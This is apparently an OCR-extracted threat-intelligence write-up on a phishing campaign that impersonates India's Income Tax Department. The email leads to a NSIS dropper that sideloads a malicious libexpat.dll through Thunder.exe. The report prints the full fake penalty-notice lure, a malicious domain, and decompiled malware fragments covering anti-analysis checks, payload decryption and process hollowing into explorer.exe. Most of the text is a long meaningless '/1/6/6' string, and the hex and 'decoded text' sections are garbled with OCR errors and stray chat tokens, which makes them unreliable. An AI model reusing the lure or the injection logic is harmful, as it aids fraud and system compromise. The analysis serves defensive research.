Allgate/1/6/6/6/6/6/6/6/6/6/6/1/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/\n  \n\nMalicious email  \n\nWe found an interesting email uploaded from India with just an attachment called \"TOPsoE India Private Limited\". The pdf looked like an official Income Tax Department document. Upon clicking on the pdf, \"ggwk[.]cc\" opens up on the browser and a zip file called \"tax affairs.exe\" is downloaded.\n\n<--- Page Split --->\n\nNo. TAX/PEN/2025-142 \n\nभारत सरकार / Government of India\nवित्त मंत्रालय / Ministry of Finance\nआयकर विभाग / Income Tax Department\nप्रवर्तन प्रभाग / Enforcement Division \n\nAayakar Bhavan,\nNew Delhi - 110001 \n\nOFFICE MEMORANDUM \n\nSub: कर अनुपालन की कमी और दंड सूचना / Tax Compliance Deficiency and Penalty Notice \n\n1. आपकी कमनी की कर निरीक्षण के दौरान आयकर अधिनियम, 1961 की धारा 271(1)(c) के तहत कर संबंधी अनियमिताएं पाई गई हैं। The tax inspection of your company has revealed irregularities under Section 271(1)(c) of the Income Tax Act, 1961. \n\n2. इस सूचना की प्राप्ति के 72 घंटे (3 दिन) के भीतर निम्नलिखित दस्तावेज आयकर विभाग को प्रस्तुत करना अनिवार्य है। It is mandatory to submit the following documents to the Income Tax Department within 72 hours (3 days) of receipt of this notice. \n\nआवश्यक दस्तावेज सूची / Required Documents List\nनीचे दिए गए लिंक से दस्तावेज डाउनलोड करें / Download documents from the link below \n\nदस्तावेज डाउनलोड करें / Download Documents \n\n3. निर्धारित समयावधि में दस्तावेज प्रस्तुत न करने पर आयकर अधिनियम की धारा 276C के तहत कानूनी कार्रवाई की जाएगी। Legal action will be taken under Section 276C of the Income Tax Act if documents are not submitted within the stipulated time. \n\n(राज कुमार शर्मा) \n\nRaj Kumar Sharma \n\nसहायक आयकर आयुक्त \n\nAssistant Commissioner of Income Tax \n\nTechnical Analysis \n\nStage - 1: Tax Affairs.zip \n\nPE32 \n\nOperation system: Windows(2000)[1386, 32-bit, GUI] \n\nLinker: Microsoft Linker(10.00.40219) \n\nCompiler: Microsoft Visual C/C++(16.00.40219)[C] \n\nLanguage: C \n\nTool: Visual Studio(2010) \n\n(Heur) Packer: Compressed or packed data[Strange overlay] \n\nInstaller: Nullsoft Scriptable Install System(2.46.5-ANSI) \n\nOverlay: Binary[Offset=0x00034c00,Size=0x002a2e40] \n\nUnknown: Unknown \n\nDetect It Easy \n\nUsing static analysis we see that the given PE file is a 32 bit GUI binary. More importantly, the file is identified as a Nullsoft Scriptable Install system (NSIS) installer. NSIS installers embed their installation script, compressed payloads etc inside the binary itself and we can move ahead to analyse it as an installer driven staging payload.\n\n<--- Page Split --->\nGetTempPathA(0x10000u, PathName); \n\nif ( sub_4032CB() || (GetWindowsDirectoryA(PathName, 0xFFBu), lstrcatA(PathName, \"\\Temp\"), sub_4032CB()) \n\nDeleteFileA(FileName); \n\nError_writing_temporary_file._Make_sure_your_temp_folder_is_val = (const char *)sub_403030(Buffer); \n\nif (!Error_writing_temporary_file._Make_sure_your_temp_folder_is_val ) \n\nif (!dword_433C24 ) \n\n{ \n\nABEL_34: \n\nuExitCode = -1; \n\nuExitCode = sub_4052E6(); \n\ngoto LABEL_35; \n\n} \n\nfor ( i = (CHAR *)sub_40567B(&sz, 0); i >= &sz && sub_4032FF(i, \"_=\", 4); --i ) \n\n; \n\nError_writing_temporary_file._Make_sure_your_temp_folder_is_val = \"Error launching installer\"; \n\nif ( i >= &sz ) \n\n{ \n\n* i = 0; \n\nlpString2_3 = i + 4; \n\nif ( !sub_405EFC(lpString2_3) ) \n\ngoto LABEL_35; \n\nlstrcpyAn_wrp(&lpString1_, lpString2_3); \n\nlstrcpyAn_wrp(Directory, lpString2_3); \n\nError_writing_temporary_file._Make_sure_your_temp_folder_is_val = 0; \n\ngoto LABEL_34; \n\n} \n\nlstrcatA(PathName, \"\\nsu.tmp\"); \n\nif ( lstrcmpiA(PathName, ::lpString2) ) \n\n{ \n\nCreateDirectoryA(PathName, 0); \n\nSetCurrentDirectoryA(PathName); \n\nif ( !lpString1_ ) \n\nlstrcpyAn_wrp(&lpString1_, ::lpString2); \n\nlstrcpyAn_wrp(lpString1_, lpString2); \n\nlstrcpyAn_wrp(&lpString1_0, \"A\"); \n\nn26 = 26;<｜end▁of▁sentence｜>\n\n<center>NSIS Installer </center>  \n\nThe NSIS installer begins by resolving a writable temporary directory using GetTempPathA. If the operation fails, it falls back to C:\\Windows\\Temp, ensuring execution reliability. Once a valid location is identified, the installer creates an NSIS specific working directory (\\~nsu.tmp) and switches the directory to it.  \n\nDropped Files   \n\n<table><tr><td>ndoe &amp;gt; AppData &amp;gt; Local &amp;gt; Temp</td><td></td><td></td><td></td></tr><tr><td>Name</td><td>Date modified</td><td>Type</td><td>Size</td></tr><tr><td>Thunder.exe</td><td>7/24/2024 10:42 PM</td><td>Application</td><td>635 KB</td></tr><tr><td>FastAnimation.dll</td><td>5/27/2025 4:38 AM</td><td>Application extens...</td><td>578 KB</td></tr><tr><td>leakrepair.dll</td><td>5/27/2025 4:40 AM</td><td>Application extens...</td><td>716 KB</td></tr><tr><td>dynlbase.dll</td><td>5/27/2025 4:48 AM</td><td>Application extens...</td><td>1,431 KB</td></tr><tr><td>libaw.dat</td><td>5/27/2025 4:59 AM</td><td>DAT File</td><td>1,121 KB</td></tr><tr><td>DumpUper.ini</td><td>5/27/2025 5:01 AM</td><td>Configuration setti...</td><td>2 KB</td></tr><tr><td>libdefa.dat</td><td>9/16/2025 7:38 AM</td><td>DAT File</td><td>321 KB</td></tr><tr><td>box.ini</td><td>9/25/2025 8:00 PM</td><td>Configuration setti...</td><td>126 KB</td></tr><tr><td>libexpat.dll</td><td>9/25/2025 8:13 PM</td><td>Application extens...</td><td>32 KB</td></tr></table>  \n\nUpon analysis we found that only 2 files are of use to us, Thunder.exe and libexpat.dll. Thunder.exe is a legitimate, digitally signed executable developed by Xunlei (迅雷), commonly distributed as part of the Thunder download manager ecosystem. In this infection chain, the binary itself is not malicious but is abused as a DLL hijacking host. When executed from installer's temporary directory, Thunder.exe loads libexpat.dll from its local path due to default DLL search order. We can confirm this in x64dbg.\n\n<--- Page Split --->\npos: 0%\n\npush eax\n\njmp tax affairs.402008\n\npush F\n\ncall tax affairs.405A65\n\npush 64\n\npush dword ptr ss:[ebp+8]\n\ncall esi\n\ncmp eax,102\n\nje tax affairs.401FFC\n\nlea eax,dword ptr ss:[ebp-8]\n\npush eax\n\npush dword ptr ss:[ebp+8]\n\ncall dword ptr ds:[<GetExitCodeProcess>]\n\ncmp dword ptr ss:[ebp-20],ebx\n\njl tax affairs.40202E\n\npush dword ptr ss:[ebp-8]\n\npush edi\n\ncall tax affairs.40589E\n\njmp tax affairs.40203A\n\ncmp dword ptr ss:[ebp-8],ebx\n\nje tax affairs.40203A\n\nmov dword ptr ss:[ebp-4],1\n\npush dword ptr ss:[ebp+8]<｜end▁of▁sentence｜>\n\n<center>DLL Loading </center>  \n\n## Stage - 2 : libexpat.dll  \n\nThe dropped libexpat.dll does not export any meaningful functions and is never explicitly invoked by Thunder.exe.The dll relies on the windows loader functionality and calls the DLLMain. This callback is invoked unconditionally, regardless of whether the DLL exports any functions or is actively used by the host process.  \n\nLet's take a look at the working of the DLL.  \n\nv4 = IsDebuggerPresent(); \n\nv5 = &unk_100056DC; \n\nif (!v4) \n\nv5 = &unk_100056E4; \n\nLogStatus((char *)&Format_1, v5); \n\nif (v4) \n\n{ \n\nLogStatus((char *)&Format_2); \n\nreturn 0; \n\n} \n\nelse if (CheckSystemResources()) \n\nGetSystemInfo(&SystemInfo); \n\ndwNumberOfProcessors = SystemInfo.dwNumberOfProcessors; \n\nv7 = &unk_1000560C; \n\nif ( SystemInfo.dwNumberOfProcessors < 4 ) \n\nv7 = &unk_10005614; \n\nLogStatus(aCpu, SystemInfo.dwNumberOfProcessors, v7); \n\nif ( dwNumberOfProcessors >= 4 ) \n\n{ \n\nif (!(unsigned __int8)Persistence()) \n\nLogStatus((char *)&Format_3); \n\nToolHelp32Snapshot = CreateToolhelp32Snapshot(2u, 0); \n\nif ( ToolHelp32Snapshot != (HANDLE)-1 ) \n\n{ \n\npe.dwSize = 556; \n\nif ( Process32Firstw(Toolhelp32Snapshot, &pe) ) \n\n{ \n\ndo \n\n{ \n\nv9 = wcscmp(pe.szExeFile, L\"ida.exe\"); \n\nif ( v9 ) \n\nv9 = v9 < 0 ? -1 : 1; \n\nif (!v9 ) \n\nLogStatus((char *)&Format_4, pe.th32ProcessID); \n\nv10 = wcscmp(pe.szExeFile, L\"x64dbg.exe\"); \n\nif ( v10 ) \n\nv10 = v10 < 0 ? -1 : 1; \n\nif (!v10 ) \n\nLogStatus((char *)&Format_5, pe.th32ProcessID); \n\n} \n\nwhile ( Process32Nextw(Toolhelp32Snapshot, &pe) );<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\n\nThe Main function begins by many anti debugging and sandbox techniques.The DLL performs process enumeration and scans the process list for common analysis and sandbox tools. Also the DLL queries for the system resources checking if minimum requirements are satisfied or not. In addition to that, if it detects any sandbox environment, it terminates the malware.  \n\nif (!DisableWindowsUpdateService() ) \n\nLogStatus((char *)&Format_6); \n\nBlock[0] = 0; \n\nBlock[1] = 0; \n\nv17 = 0; \n\nv18 = 0; \n\nif ( LoadAndDecryptPayload(Block) ) \n\nv11 = ProcessHollowing((int)Block); \n\nFormat = (char *)&unk_100059C0; \n\nif ( v11 ) \n\nFormat = (char *)&byte_100059CC; \n\n} \n\nelse \n\n} \n\nFormat = (char *)&unk_100059E0; \n\n} \n\nLogStatus(Format); \n\nDisableThreadLibraryCalls(hinstDLL); \n\nCreateThread(0, 0, StartAddress, 0, 0, 0); \n\nv13 = Block[0]; \n\nif ( Block[0] ) \n\n} \n\nif ( v17 - (unsigned int)Block[0] >= 0x1000 ) \n\nv13 = (void *)*((_DWORD *)Block[0] - 1); \n\nif ( (unsigned int)((char *)Block[0] - (char *)v13 - 4) > 0x1F ) \n\ninvalid_parameter_noinfo_noreturn(); \n\n} \n\nsub_10003E6E(v13);<｜end▁of▁sentence｜>\n\n<center>Payload Decryption </center>  \n\nOnce the DLL completes its anti analysis checks, it enters the core execution logic. It first disables the Windows Update service(wuauserv) then loads an encrypted payload from the disk. The payload is dynamically resolved and loads the box.ini file from the temporary directory. The file is fully read into memory, decrypted using embedded cryptographic constants and later on executed as shellcode.  \n\n<table><tr><td>00</td><td>01</td><td>02</td><td>03</td><td>04</td><td>05</td><td>06</td><td>07</td><td>08</td><td>09</td><td>OA</td><td>OB</td><td>OC</td><td>OD</td><td>OE</td><td>OF</td></tr><tr><td>9B</td><td>80</td><td>9D</td><td>8E</td><td>89</td><td>C3</td><td>23</td><td>6B</td><td>A6</td><td>95</td><td>C5</td><td>FC</td><td>B7</td><td>2A</td><td>CB</td><td>OD</td></tr><tr><td>D4</td><td>CF</td><td>6B</td><td>FF</td><td>F8</td><td>6F</td><td>AC</td><td>9C</td><td>D8</td><td>94</td><td>6A</td><td>50</td><td>32</td><td>F0</td><td>B1</td><td>FC</td></tr><tr><td>E1</td><td>29</td><td>25</td><td>0D</td><td>5A</td><td>2A</td><td>E7</td><td>A3</td><td>4C</td><td>7B</td><td>54</td><td>A1</td><td>F7</td><td>2B</td><td>4E</td><td>60</td></tr><tr><td>14</td><td>CF</td><td>71</td><td>43</td><td>65</td><td>4B</td><td>B3</td><td>12</td><td>80</td><td>73</td><td>54</td><td>F5</td><td>A4</td><td>0B</td><td>ED</td><td>71</td></tr><tr><td>A6</td><td>6B</td><td>6B</td><td>5C</td><td>0D</td><td>6F</td><td>57</td><td>F0</td><td>F8</td><td>C3</td><td>F6</td><td>15</td><td>F2</td><td>8F</td><td>81</td><td>EB</td></tr><tr><td>6C</td><td>18</td><td>A0</td><td>F4</td><td>DB</td><td>9F</td><td>47</td><td>00</td><td>8C</td><td>A7</td><td>CE</td><td>0E</td><td>EB</td><td>92</td><td>CF</td><td>89</td></tr><tr><td>83</td><td>87</td><td>D0</td><td>70</td><td>D4</td><td>C9</td><td>42</td><td>64</td><td>BF</td><td>78</td><td>8D</td><td>C5</td><td>84</td><td>93</td><td>9B</td><td>90</td></tr><tr><td>74</td><td>BA</td><td>DE</td><td>B5</td><td>E8</td><td>A1</td><td>86</td><td>44</td><td>CC</td><td>AD</td><td>C3</td><td>C0</td><td>7C</td><td>A1</td><td>94</td><td>6F</td></tr><tr><td>54</td><td>62</td><td>72</td><td>F8</td><td>9F</td><td>6F</td><td>C4</td><td>R9</td><td>07</td><td>19</td><td>1D</td><td>F7</td><td>6F</td><td>17</td><td>DN</td><td>8F</td></tr></table>\n\nDecoded text \n\n\"E.ZNA#k!·Aü·*E.\nÖİkyoo-oeo\"jP2&tü\ná)%.Z*ç£L(Tj÷+N'\n.İqCeK°.eStÖn.iq\n!kk\\.ow&oAö.ö..ë\n1. öÜYG.ÇSİ.ë'İn\nf#DpÖÉBdžx.Ä„“>.\nt°Pue;tDİ.ÄÄ|;\"o\nThræšnÄi...-n.ÝÝ<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\nStartupInfo.dwFlags = STARTF_USESHOWWINDOW; \n\nmemset(&StartupInfo.wShowWindow, 0, 20); \n\nif ( GetFileAttributesA(\"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\") == -1 ) \n\nLastError = GetLastError(); \n\nLogStatus((char *)&Format_17, \"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\", LastError); return 0; \n\nif (!CreateProcessA( \n\n\"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\", \n\n0, \n\n0, \n\n0, \n\n0, \n\nCREATE_SUSPENDED | CREATE_NO_WINDOW, \n\n0, \n\n0, \n\n&StartupInfo, \n\n&ProcessInformation) ) \n\n{ \n\nerr = GetLastError(); \n\nLogStatus((char *)&Format_18, err, \"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\"); return 0; \n\nLogStatus((char *)&Format_19, ProcessInformation.dwProcessId, ProcessInformation.dwThreadId); Context.ContextFlags = 65543; \n\nif (!GetThreadContext(ProcessInformation.hThread, &Context) ) \n\nerr_1 = GetLastError(); \n\nLogStatus((char *)&Format_20, err_1); \n\nLABEL_7: \n\nCloseHandle(ProcessInformation.hThread); \n\nCloseHandle(ProcessInformation.hProcess);<｜end▁of▁sentence｜>\n\n<center>Process Injection </center>  \n\nThe shellcode is executed using a classic technique called Process Injection. The routine begins by verifying the presence of explorer.exe, which is later used as the target process. The binary is launched in suspended state and the malware retrieves the initial thread context. Further it allocates executable memory inside the remote process via VirtualAllocEx and writes the payload via WriteProcessMemory.  \n\nerrno_t LogStatus(char *Format, ...) \n\nerrno_t result; // eax \n\nint v2; // ecx \n\nsigned int Size; // kr00_4 \n\nvoid *Buffer_3; // edi \n\nsigned int i; // edx \n\nFILE *Stream; // [esp+Ch] [ebp-880h] BYREF \n\n_SYSTEMTIME SystemTime; // [esp+10h] [ebp-87Ch] BYREF \n\nchar Buffer[1024]; // [esp+20h] [ebp-86Ch] BYREF \n\nchar Buffer_2[1092]; // [esp+420h] [ebp-46Ch] BYREF \n\nchar Buffer_1[32]; // [esp+864h] [ebp-28h] BYREF \n\nva_list ArgList; // [esp+898h] [ebp+Ch] BYREF \n\nva_start(ArgList, Format); \n\nStream = 0; \n\nresult = fopen_s(&Stream, \"C:\\\\data.db\", \"ab+\"); \n\nif (!result && Stream) \n\nGetLocalTime(&SystemTime); \n\nsub_10003860(Buffer_1, \"[%04d-%02d-%02d %02d:%02d:%02d]\", SystemTime.wYear); 